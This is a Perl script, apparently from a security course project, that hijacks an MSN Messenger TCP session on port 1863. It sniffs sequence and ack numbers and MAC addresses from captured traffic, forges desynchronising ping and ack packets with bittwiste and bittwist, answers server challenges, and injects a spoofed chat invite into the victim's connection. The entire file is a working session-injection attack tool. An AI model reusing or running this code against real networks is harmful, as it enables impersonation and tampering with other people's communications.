$interface = $ARGV[0];

$ns_ip = "";
$ns_seq = 0;
$ns_ack = 0;
$ns_mac = "";
$ns_fake_mac = "22:66:88:AA:CC:EE";

$local_ip = "";
$local_port = 0;
$local_seq = 0;
$local_ack = 0;
$local_mac = "";
$local_fake_mac = "EE:CC:AA:88:66:22";

$ns_ack_new = 0;
$ns_seq_new = 0;
$local_ack_new = 0;
$local_seq_new = 0;

$packetmade = 0;
$packetsent = 0;
$hackcontinued = 0;
$ackcap = "ack.pcap";
   
# ns -> bob, invite, length 112
$invite = "RNG 1312697181 oliverzheng.com:1863 CKI 17021696.318151 eece412alice\@hotmail.com Alice U messenger.msn.com 1\r\n  ";
# challenge, length 32
$chl = "CHL 0 18359197213018043653\r\n    ";
# ping, length 5
$png = "PNG\r\n";

$DEBUG = 0;

local $SIG{ALRM} = "beginHack";

sub ascii_to_hex ($)
{
   (my $str = shift) =~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;
   return $str;
}

if ($DEBUG == 0) {
   while (<STDIN>) {
      # flush buffer for next output
      $|++;
      &processPacket($_);
   }
} else {
   #$packets = "";
   #for ($i = 0; $i < 24; $i++) {
      #sendPacket("server_png.pcap." . $i);
      #sendPacket("server_qng_ack.pcap." . $i);
   #   $packets .= "server_png.pcap.$i bogus.pcap $server_qng_ack.pcap.$i bogus.pcap ";
   #}
   #print $packets;
   @packets = ("bogus2.pcap bogus.pcap bogus3.pcap");
   sendPacket(@packets);
}

sub buildPacket {
   local $capfile = $_[0];
   local $outfile = $_[1];
   local $dst_mac = $_[2];
   local $src_mac = $_[3];
   local $dst_ip  = $_[4];
   local $src_ip  = $_[5];
   local $dst_prt = $_[6];
   local $src_prt = $_[7];
   local $seq     = $_[8];
   local $ack     = $_[9];
   local $load    = $_[10];
   local $seqonly = $_[11];
   
   if ($seqonly == 1) {
      @args = ("bittwiste", "-I", "temp/" . $capfile, "-O", "temp/" . $outfile,
            "-T", "tcp", "-q", $seq, "-a", $ack);
      system(@args);
   } else {
      @args = ("bittwiste", "-I", "temp/" . $capfile, "-O", "temp/" . $capfile . ".ip",
               "-T", "ip", "-s", $src_ip, "-d", $dst_ip);
      system(@args);
      if ($load ne "") {
         @args = ("bittwiste", "-I", "temp/" . $capfile . ".ip", "-O", "temp/" . $capfile . ".tcp",
                  "-T", "tcp", "-s", $src_prt, "-d", $dst_prt, "-q", $seq, "-a", $ack, "-f", "pa");
      } else {
         @args = ("bittwiste", "-I", "temp/" . $capfile . ".ip", "-O", "temp/" . $capfile . ".tcp",
                  "-T", "tcp", "-s", $src_prt, "-d", $dst_prt, "-q", $seq, "-a", $ack);
      }
      system(@args);
      @args = ("bittwiste", "-I", "temp/" . $capfile . ".tcp", "-O", "temp/" . $capfile . ".eth",
               "-T", "eth", "-d", $dst_mac, "-s", $src_mac);
      system(@args);
      if ($load ne "") {
         @args = ("bittwiste", "-I", "temp/" . $capfile . ".eth", "-O", "temp/" . $outfile,
                  "-X", ascii_to_hex($load), "-L", "4", "-T", "tcp");
      } else {
         @args = ("bittwiste", "-I", "temp/" . $capfile . ".eth", "-O", "temp/" . $outfile);
      }
      system(@args);
   }
}

sub sendPacket {
   @files = split(' ', $_[0]);
   @args = ("bittwist.exe",  "-i", $interface);
   foreach(@files) {
      push(@args, "temp/" . $_);
   }
   system(@args);
}


sub trim($)
{
   my $string = shift;
   $string =~ s/^\s+//;
   $string =~ s/\s+$//;
   return $string;
}

sub beginHack {
   print "Creating packets\n";
   $packetmade = 1;
   
   buildPacket($ackcap, "server_png_prep.pcap",
               $ns_mac, $local_mac,
               $ns_ip, $local_ip,
               "1863", $local_port,
               0, 0,
               $png);
   buildPacket($ackcap, "server_qng_ack_prep.pcap",
               $ns_mac, $local_mac,
               $ns_ip, $local_ip,
               "1863", $local_port,
               0, 0,
               "");
   
   # build packets to the server
   $local_seq_new = $local_seq + 5;
   $local_ack_new = $local_ack + 8;
   for ($i = 0; $i < 24; $i++) {
      buildPacket("server_png_prep.pcap", "server_png.pcap." . $i,
                  $ns_mac, $local_mac,
                  $ns_ip, $local_ip,
                  "1863", $local_port,
                  $local_seq_new, $local_ack_new,
                  $png, 1);
      $local_seq_new += 5;
      $local_ack_new += 8;
      buildPacket("server_qng_ack_prep.pcap", "server_qng_ack.pcap." . $i,
                  $ns_mac, $local_mac,
                  $ns_ip, $local_ip,
                  "1863", $local_port,
                  $local_seq_new, $local_ack_new,
                  "", 1);
   }
}

sub sendPackets {
   $packetsent = 1;
   
   $packets = "";
   for ($i = 0; $i < 24; $i++) {
      #sendPacket("server_png.pcap." . $i);
      #sendPacket("server_qng_ack.pcap." . $i);
      $packets .= "server_png.pcap.$i bogus.pcap server_qng_ack.pcap.$i bogus.pcap ";
   }
   $packets = trim($packets);
   sendPacket($packets);
   
   # send the first chl packet
   $ns_seq_new = $ns_seq + 8; # this is because the QNG for the second PNG has not yet been processed by the ack/seq sync-ers
   $ns_ack_new = $ns_ack;
   buildPacket($ackcap, "client_chl.pcap.1",
               $local_mac, $ns_mac,
               $local_ip, $ns_ip,
               $local_port, "1863",
               $ns_seq_new, $ns_ack_new,
               $chl);
   $ns_seq_new += 32;
   $ns_ack_new += 60;

   sendPacket("client_chl.pcap.1");
}

sub continueHack {
   $hackcontinued = 1;
   $qry_num = $_[0];
   
   # respond to the first chl
   $qry = "QRY $qry_num\r\n";
   buildPacket($ackcap, "client_qry.pcap.1",
               $local_mac, $ns_mac,
               $local_ip, $ns_ip,
               $local_port, "1863",
               $ns_seq_new, $ns_ack_new,
               $qry);
   sendPacket("client_qry.pcap.1");
   sendPacket("server_qng_ack.pcap.23");
   $ns_seq_new += 8;
   
   # build the last chl/qry packets to the client
   buildPacket($ackcap, "client_chl.pcap.2",
               $local_mac, $ns_mac,
               $local_ip, $ns_ip,
               $local_port, "1863",
               $ns_seq_new, $ns_ack_new,
               $chl);
   $ns_seq_new += 32;
   $ns_ack_new += 60;

   $qry_num++;
   $qry = "QRY $qry_num\r\n";
   buildPacket($ackcap, "client_qry.pcap.2",
               $local_mac, $ns_mac,
               $local_ip, $ns_ip,
               $local_port, "1863",
               $ns_seq_new, $ns_ack_new,
               $qry);
   $ns_seq_new += 8;
   
   # send the second chl/qry
   sendPacket("client_chl.pcap.2");
   sendPacket("server_qng_ack.pcap.23");
   sendPacket("client_qry.pcap.2");
   sendPacket("server_qng_ack.pcap.23");

   # build the spoof packet
   buildPacket($ackcap, "client_invite.pcap",
               $local_mac, $ns_mac,
               $local_ip, $ns_ip,
               $local_port, "1863",
               $ns_seq_new, $ns_ack_new,
               $invite);
   
   #send the spoof message
   sendPacket("client_invite.pcap");
}

sub processPacket {
   # match "IP src > dst: flags data-seqno ack window urgent options" pattern
   if ($_[0] =~ m/([\d\.]+)\.(\d+) \> ([\d\.]+)\.(\d+): ([SFPRWE\.]+)\s*\d*:*(\d*)\(*\d*\)* ack (\d+)/) {
      # set initial NS IP and local IP:port if not already set
      if ($ns_ip eq "") {
         if ($2 == 1863) {
            $ns_ip = $1;
            $local_ip = $3;
            $local_port = $4;
         } elsif ($4 == 1863) {
            $ns_ip = $3;
            $local_ip = $1;
            $local_port = $2;
         }
         print "Set up.\n";
      }
      # find seq & ack numbers
      # packet is sent from local ip
      if ($1 eq $local_ip) {
         # not an ack packet
         if ($5 ne ".") {
            $local_seq = $6;
            $ns_ack = $6;
         }
         $local_ack = $7;
         $ns_seq = $7;
      } else {
         if ($5 ne ".") {
            $local_ack = $6;
            $ns_seq = $6;
         }
         $local_seq = $7;
         $ns_ack = $7;
      }
      
      # only match the mac addresses once
      if ($local_mac eq "") {
         if ($1 eq $local_ip) {
            if ($_[0] =~ m/([\w:]{17})* \> ([\w:]{17})*/) {
               $local_mac = $1;
               $ns_mac = $2;
            }
         } else {
            if ($_[0] =~ m/([\w:]{17})* \> ([\w:]{17})*/) {
               $local_mac = $2;
               $ns_mac = $1;
            }
         }
      }
   } elsif (($packetmade == 0) && ($_[0] =~ m/PNG/)) {
      alarm 3;
   } elsif (($hackcontinued == 0) && ($packetmade == 1) && ($packetsent == 0)) {
      if ($_[0] =~ m/PNG/) {
         sendPackets();
      }
   } elsif (($hackcontinued == 0) && ($packetmade == 1) && ($packetsent == 1)) {
      if ($_[0] =~ m/QRY\.([\d]{2})/) {
         continueHack($1);
      }
   }
}
